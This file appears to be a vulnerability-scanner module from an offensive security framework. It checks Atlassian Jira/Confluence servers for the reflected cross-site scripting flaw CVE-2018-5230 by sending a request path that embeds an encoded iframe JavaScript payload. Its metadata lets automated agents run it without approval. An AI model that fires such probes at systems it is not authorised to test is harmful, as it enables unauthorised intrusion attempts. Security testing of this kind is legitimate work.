#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Atlassian Jira Confluence before version 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atlassian Jira Confluence - Cross-Site Scripting Detection',
        'description': 'Atlassian Jira Confluence before version 7.6.6, from version 7.7.0 before version 7.7.4, from version 7.8.0 before version 7.8.4, and from version 7.9.0 before version 7.9.2, allows remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting vulnerability in the error message of custom fields when an invalid value is specified.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'atlassian', 'confluence', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://jira.atlassian.com/browse/JRASERVER-67289',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-5230',
            'https://github.com/sushantdhopat/JIRA_testing',
            'https://github.com/Elsfa7-110/kenzer-templates',
            'https://github.com/Faizee-Asad/JIRA-Vulnerabilities',
        ],
        'cve': 'CVE-2018-5230',
    }

    def run(self):
        r = self.http_request(method="GET", path='/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<iframe src="javascript:alert(document.domain)">', 'confluence',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Atlassian Jira Confluence - Cross-Site Scripting detected",
                path='/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm',
            )
            return True
        return False

